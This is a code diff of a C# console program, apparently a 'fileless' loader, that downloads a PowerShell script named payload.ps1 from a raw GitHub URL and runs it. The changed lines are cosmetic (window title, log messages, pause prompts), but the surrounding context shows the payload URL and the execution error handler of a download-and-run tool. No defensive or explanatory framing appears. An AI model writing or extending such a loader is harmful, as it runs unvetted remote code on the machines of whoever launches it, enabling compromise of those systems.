@@ -8,7 +8,8 @@ class Program
 {
     static async Task Main()
     {
-        Console.WriteLine("[INFO] Starting PowerShell script execution.");
+        Console.Title = "PowerShell Executor"; // Set Console Window Title
+        Console.WriteLine("[INFO] Starting PowerShell script execution...");
 
         string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1";
         Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");
@@ -27,7 +28,7 @@ class Program
             Console.WriteLine("[ERROR] No payload fetched. Exiting...");
         }
 
-        Console.WriteLine("Press Enter to exit...");
+        Console.WriteLine("[INFO] Execution completed. Press Enter to exit...");
         Console.ReadLine();
     }
 
@@ -84,8 +85,12 @@ class Program
         {
             Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
         }
+
+        Console.WriteLine("[INFO] Press Enter to continue...");
+        Console.ReadLine();
     }
 }
+
 
 
 
